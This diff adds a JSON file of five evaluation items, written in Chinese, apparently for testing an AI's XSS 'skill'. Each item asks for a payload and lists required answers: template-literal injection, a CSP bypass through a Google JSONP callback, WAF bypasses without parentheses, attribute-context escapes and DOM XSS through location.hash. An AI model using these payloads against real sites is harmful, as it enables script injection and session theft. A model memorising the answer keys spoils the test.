@@ -1,0 +1,95 @@
+{
+  "skill_name": "xss-methodology",
+  "evals": [
+    {
+      "id": 1,
+      "name": "xss-context-decision-tree",
+      "prompt": "你发现用户输入 test123 出现在以下位置：var config = `Welcome, test123`（JavaScript 模板字面量内）。请给出针对模板字面量上下文的 XSS payload。",
+      "expected_output": "利用模板字面量的 ${} 语法执行代码",
+      "expectations": [
+        "${alert(1)}|${constructor}|模板字面量注入",
+        "反引号|`|模板字符串|template literal",
+        "不同上下文|不同payload|上下文分析",
+        "闭合|`+alert(1)+`|逃逸模板",
+        "JavaScript上下文|不是HTML上下文"
+      ],
+      "required_terms": [
+        "${alert(1)}",
+        "${constructor}",
+        "`+alert(1)+`"
+      ]
+    },
+    {
+      "id": 2,
+      "name": "xss-csp-bypass-jsonp",
+      "prompt": "目标有反射型 XSS，但 CSP 策略为：script-src 'self' *.google.com。<script>alert(1)</script> 被 CSP 拦截了。请描述你如何绕过此 CSP。",
+      "expected_output": "利用 Google JSONP 回调绕过 CSP",
+      "expectations": [
+        "JSONP|callback|Google|accounts.google.com",
+        "script src|加载外部JS|白名单域",
+        "revoke?callback=alert(1)|JSONP回调注入",
+        "self|同源|上传JS文件|JSONP端点",
+        "CSP绕过|白名单域利用|信任域上的可控脚本"
+      ],
+      "required_terms": [
+        "accounts.google.com",
+        "revoke?callback=alert(1)",
+        "JSONP"
+      ]
+    },
+    {
+      "id": 3,
+      "name": "xss-parentheses-blocked",
+      "prompt": "你发现 XSS 点，但 WAF 过滤了括号 ()。alert(1) 和 confirm(1) 都被拦截。请描述你的绕过方法。",
+      "expected_output": "无括号 XSS payload",
+      "expectations": [
+        "onerror=alert;throw 1|throw触发onerror",
+        "alert`1`|反引号|模板标签调用",
+        "window.onerror=alert|全局错误处理器",
+        "location|document.cookie|无括号赋值",
+        "括号被过滤|不用()|替代调用方式"
+      ],
+      "required_terms": [
+        "onerror=alert;throw 1",
+        "window.onerror=alert",
+        "alert`1`"
+      ]
+    },
+    {
+      "id": 4,
+      "name": "xss-attribute-context-escape",
+      "prompt": "用户输入出现在 <input value=\"INJECT\"> 的 value 属性中（双引号包裹）。双引号 \" 没有被过滤。请给出 XSS payload 并解释属性上下文的逃逸原理。",
+      "expected_output": "属性上下文逃逸：闭合双引号后注入事件属性",
+      "expectations": [
+        "\" onfocus=alert(1) autofocus=\"|闭合引号",
+        "属性上下文|闭合引号|逃逸属性",
+        "事件属性|onfocus|onmouseover|onerror",
+        "autofocus|自动触发|不需用户交互",
+        "\"><script>|闭合标签|新建标签"
+      ],
+      "required_terms": [
+        "\" onfocus=alert(1) autofocus=\"",
+        "\"><script>",
+        "onfocus"
+      ]
+    },
+    {
+      "id": 5,
+      "name": "xss-dom-source-sink",
+      "prompt": "你在目标页面的 JavaScript 中发现 document.getElementById('output').innerHTML = location.hash.substring(1);。请分析这段代码的安全问题并给出利用方法。",
+      "expected_output": "DOM XSS：location.hash 作为 source，innerHTML 作为 sink",
+      "expectations": [
+        "DOM XSS|客户端|不经过服务端",
+        "location.hash|source|用户可控输入",
+        "innerHTML|sink|危险操作|HTML解析",
+        "#<img src=x onerror=alert(1)>|URL fragment注入",
+        "不在服务端日志|纯前端|难以检测"
+      ],
+      "required_terms": [
+        "location.hash",
+        "#<img src=x onerror=alert(1)>",
+        "DOM XSS"
+      ]
+    }
+  ]
+}
